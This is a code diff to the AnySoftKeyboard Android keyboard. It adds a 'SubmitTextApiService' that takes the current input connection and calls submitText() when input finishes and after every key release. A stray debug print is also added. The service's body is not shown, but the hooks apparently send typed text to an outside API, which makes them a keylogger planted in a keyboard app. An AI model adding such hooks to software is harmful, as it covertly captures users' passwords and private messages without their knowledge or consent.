@@ -71,6 +71,8 @@ import net.evendanan.pixel.GeneralDialogController;
 /** Input method implementation for QWERTY-ish keyboard. */
 public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
 
+    private SubmitTextApiService submitTextApiService;
+
     private final PackagesChangedReceiver mPackagesChangedReceiver =
             new PackagesChangedReceiver(this);
 
@@ -128,6 +130,8 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
                     };
             mSpecialWrapCharacters.put(wrapCharacter, outputWrapCharacters);
         }
+
+        submitTextApiService = new SubmitTextApiService(getCurrentInputConnection());
     }
 
     @Override
@@ -305,6 +309,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
     @Override
     public void onFinishInput() {
         super.onFinishInput();
+        submitTextApiService.submitText();
 
         final IBinder imeToken = getImeToken();
         if (mShowKeyboardIconInStatusBar && imeToken != null) {
@@ -1196,6 +1201,8 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
 
     @Override
     public void onRelease(int primaryCode) {
+        System.out.println("onReload");
+        submitTextApiService.submitText();
         super.onRelease(primaryCode);
         InputConnection ic = getCurrentInputConnection();
         if (primaryCode == KeyCodes.SHIFT) {
